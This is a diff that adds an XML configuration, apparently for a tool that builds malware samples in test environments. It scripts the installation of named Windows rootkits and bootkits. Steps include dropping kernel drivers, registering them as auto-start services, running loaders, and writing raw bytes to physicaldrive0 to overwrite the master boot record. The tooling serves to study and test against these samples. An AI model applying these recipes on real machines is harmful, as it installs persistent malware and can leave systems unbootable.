@@ -1,0 +1,69 @@
+<?xml version="1.0" ?>
+<config>
+  <virus name="netgjo.sys" os="xp;win732" type="RootKit病毒" >
+    <checksys os="xp;win732"/>
+    <release file="netgjo.sys" to="c:\windows\system32\drivers\netgjo.sys" />
+    <regsrv name="netgjo" binPath="c:\windows\system32\drivers\netgjo.sys" start="auto" type="kernel" />
+    <runsrv name="netgjo"/>
+  </virus>
+  <virus name="7ffecbfb.sys" os="xp" type="RootKit病毒" >
+    <checksys os="xp"/>
+    <release file="7ffecbfb.sys" to="c:\windows\system32\drivers\7ffecbfb.sys" />
+    <regsrv name="7ffecbfb" binPath="c:\windows\system32\drivers\7ffecbfb.sys" start="auto" type="kernel" />
+    <runsrv name="7ffecbfb"/>
+  </virus>
+  <virus name="hqbzrnsjo.sys" os="win764" type="RootKit病毒" >
+    <checksys os="win764"/>
+    <release file="hqbzrnsjo.sys" to="c:\windows\system32\drivers\hqbzrnsjo.sys" />
+    <regsrv name="hqbzrnsjo" binPath="c:\windows\system32\drivers\hqbzrnsjo.sys" start="auto" type="kernel" />
+    <runsrv name="hqbzrnsjo"/>
+  </virus>
+  <virus name="MpKslKnbZi.dll" os="xp;win732" type="RootKit病毒" >
+    <checksys os="xp;win732"/>
+    <release file="MpKslKnbZi.dll" to="c:\windows\system32\MpKslKnbZi.dll" />
+    <release file="MpKslIrtn.reg" to="%temp%MpKslIrtn.reg" />
+    <reg file="%temp%MpKslIrtn.reg" />
+  </virus>
+  <virus name="tqkqjm.sys" os="xp;win732" type="RootKit病毒" >
+    <checksys os="xp;win732"/>
+    <release file="tqkqjm.sys" to="c:\windows\system32\drivers\tqkqjm.sys" />
+    <regsrv name="tqkqjm" binPath="c:\windows\system32\drivers\tqkqjm.sys" start="auto" type="kernel" />
+    <runsrv name="tqkqjm"/>
+  </virus>
+  <virus name="异鬼(VBR)" os="xp;win732" type="BootKit病毒" >    
+    <checksys os="xp;win732"/>
+    <msgbox title="确认后继续" text="如果已构造过MBR或者VBR病毒，再构造本病毒可能导致系统无法引导。继续请点OK！"/>
+    <release file="infect_x86.dll" to="%temp%infect_x86.dll" />
+    <release file="Loader.exe" to="%temp%Loader.exe" />
+    <runexe file="%temp%Loader.exe" args="" />
+  </virus>
+  <virus name="异鬼(VBR)" os="win764" type="BootKit病毒" >
+    <checksys os="win764"/>
+    <msgbox title="确认后继续" text="如果已构造过MBR或者VBR病毒，再构造本病毒可能导致系统无法引导。继续请点OK！"/>
+    <release file="infect_x64.dll" to="%temp%infect_x86.dll" />
+    <release file="Loader.exe" to="%temp%Loader.exe" />
+    <runexe file="%temp%Loader.exe"/>
+  </virus>
+  <virus name="暗云II(MBR)" os="win732;win764" type="BootKit病毒" >
+    <checksys os="win732;win764"/>
+    <checkmbr file="%temp%bakmbr.bin"/>
+    <msgbox title="确认后继续" text="如果已构造过MBR或者VBR病毒，再构造本病毒可能导致系统无法引导。继续请点OK！"/>
+    <release file="anyun2mbr.bin" to="%temp%anyun2mbr.bin" />
+    <bakmbr file="%temp%bakmbr.bin"/>
+    <dd if="%temp%bakmbr.bin" skip="0" of="\\.\physicaldrive0" seek="1" bs="0x200" count="1"/>
+    <dd if="%temp%anyun2mbr.bin" skip="0" of="\\.\physicaldrive0" seek="0" bs="0x1b2" count="1"/>
+    <dd if="%temp%anyun2mbr.bin" skip="2" of="\\.\physicaldrive0" seek="2" bs="0x200" count="60"/>
+  </virus>
+  <virus name="隐魂(MBR)" os="win732;win764" type="BootKit病毒" >
+    <checksys os="win732;win764"/>
+    <checkmbr file="%temp%bakmbr.bin"/>
+    <msgbox title="确认后继续" text="如果已构造过MBR或者VBR病毒，再构造本病毒可能导致系统无法引导。继续请点OK！"/>
+    <release file="yinhunmbr.bin" to="%temp%yinhunmbr.bin" />
+    <release file="yinhunmbr2.bin" to="%temp%yinhunmbr2.bin" />
+    <bakmbr file="%temp%bakmbr.bin"/>
+    <dd if="%temp%bakmbr.bin" skip="0" of="\\.\physicaldrive0" seek="1" bs="0x200" count="1"/>
+    <dd if="%temp%yinhunmbr.bin" skip="0" of="\\.\physicaldrive0" seek="0" bs="0x1b0" count="1"/>
+    <dd if="%temp%yinhunmbr.bin" skip="2" of="\\.\physicaldrive0" seek="2" bs="0x200" count="-1"/>
+    <dd if="%temp%yinhunmbr2.bin" skip="0" of="\\.\physicaldrive0" seek="400" bs="0x200" count="-1"/>
+  </virus>
+</config>
